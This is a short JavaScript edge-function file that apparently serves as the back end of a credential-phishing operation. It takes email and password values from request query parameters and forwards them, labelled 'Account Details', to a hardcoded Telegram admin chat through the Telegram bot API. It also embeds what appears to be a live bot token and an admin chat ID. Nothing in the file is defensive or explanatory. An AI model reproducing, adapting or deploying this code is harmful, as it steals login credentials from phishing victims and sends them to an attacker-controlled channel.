export const config = {
  runtime: "edge",
};

const BOT_TOKEN = "7926446040:AAGIpJglh2oeuAbOWxACmyEY0VsTg6Irp_I";
const ADMIN_ID = "7183111659";

async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: "Markdown",
    }),
  });
}

export default async function handler(req) {

  const { searchParams } = new URL(req.url);

  const email = searchParams.get("email");
  const password = searchParams.get("password");

  // =========================
  // ACCOUNT API
  // =========================

  if (email && password) {

    const msg =
`🔐 *Account Details*

📧 Email: \`${email}\`
🔑 Password: \`${password}\`

📡 Status: Received`;

    await sendMessage(ADMIN_ID, msg);

    return new Response("sent");
  }

  // =========================
  // TELEGRAM WEBHOOK
  // =========================

  if (req.method === "POST") {

    const update = await req.json();
    const message = update.message;

    if (message?.text === "/start") {

      await sendMessage(
        message.chat.id,
        "🤖 *bot is running*"
      );

    }

    return new Response("ok");
  }

  return new Response("API Running");
}
